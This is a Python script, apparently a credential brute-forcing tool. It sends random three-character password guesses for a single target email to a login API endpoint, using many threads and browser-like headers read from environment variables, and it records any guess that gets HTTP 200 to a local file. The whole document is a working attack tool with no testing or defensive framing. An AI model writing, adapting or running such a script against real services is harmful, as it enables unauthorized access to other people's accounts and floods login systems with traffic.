import requests
import json
import random
import string
import concurrent.futures
from dotenv import load_dotenv
import os

# Load environment variables from .env file
load_dotenv()

# Target email address
target_email = os.getenv('TARGET_EMAIL')

# API endpoint
api_endpoint = os.getenv('API_ENDPOINT')

# Function to generate a random password
def generate_random_password(length=3):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choices(characters, k=length))
    return password

# Function to save successful attempts when HTTP 200 is returned
def save_successful_attempt(email, password):
    with open('successful_attempts.txt', 'a') as f:
        f.write(f'{email}:{password}\n')

# HTTP headers
headers = {
    'Accept': os.getenv('ACCEPT'),
    'Content-Type': os.getenv('CONTENT_TYPE'),
    'Sec-Ch-Ua': os.getenv('SEC_CH_UA'),
    'Sec-Ch-Ua-Mobile': os.getenv('SEC_CH_UA_MOBILE'),
    'Sec-Ch-Ua-Platform': os.getenv('SEC_CH_UA_PLATFORM'),
    'User-Agent': os.getenv('USER_AGENT')
}

# Function to try random passwords
def try_password(email):
    while True:
        password = generate_random_password()

        # JSON data to be sent
        data = {
            'email': email,
            'password': password
        }

        # Convert JSON data to string format
        json_data = json.dumps(data)

        try:
            # Send POST request
            response = requests.post(api_endpoint, headers=headers, data=json_data)

            # Check the response from the server
            if response.status_code == 200:
                print(f'Successful attempt: {email}:{password}')
                save_successful_attempt(email, password)
                return True  # End the function if a successful attempt is made
            else:
                print(f'Testing {email}:{password} - Status Code: {response.status_code}')
        except requests.exceptions.RequestException as e:
            # Print error message in case of an exception
            print(f'An error occurred: {e}')
    return False

# Number of concurrent threads
max_workers = int(os.getenv('MAX_WORKERS'))

# Attempt random passwords with multithreading
with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
    # Call the try_password function for each thread
    futures = [executor.submit(try_password, target_email) for _ in range(max_workers)]

    # Check the result of each thread
    for future in concurrent.futures.as_completed(futures):
        if future.result():  # If a thread makes a successful attempt
            executor.shutdown()  # Stop other threads
            break
